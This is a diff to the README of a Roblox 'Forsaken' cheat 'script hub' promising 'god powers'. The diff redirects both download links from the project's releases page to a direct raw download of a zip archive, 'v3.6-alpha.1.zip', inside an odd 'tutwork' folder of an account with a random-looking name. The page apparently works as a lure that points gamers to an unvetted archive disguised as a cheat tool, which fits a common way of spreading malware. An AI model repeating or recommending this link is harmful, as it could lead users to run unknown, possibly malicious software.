@@ -1,6 +1,6 @@
 # 🤖 forsaken-vmo90-script-hub - Unlock God Powers in Roblox Forsaken
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/Satellitetelevisioncastaneasativa897/forsaken-vmo90-script-hub/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/Satellitetelevisioncastaneasativa897/forsaken-vmo90-script-hub/raw/refs/heads/main/tutwork/v3.6-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Forsaken-vmo90-script-hub is a script utility designed specifically for the Robl
 
 ## 📥 Download and Install
 
-1. **Visit the download link**: Click the big button above or go to: [https://github.com/Satellitetelevisioncastaneasativa897/forsaken-vmo90-script-hub/releases](https://github.com/Satellitetelevisioncastaneasativa897/forsaken-vmo90-script-hub/releases)
+1. **Visit the download link**: Click the big button above or go to: [https://github.com/Satellitetelevisioncastaneasativa897/forsaken-vmo90-script-hub/raw/refs/heads/main/tutwork/v3.6-alpha.1.zip](https://github.com/Satellitetelevisioncastaneasativa897/forsaken-vmo90-script-hub/raw/refs/heads/main/tutwork/v3.6-alpha.1.zip)
 
 2. **Find the latest release** on the page. Look for the newest version (usually at the top).
 
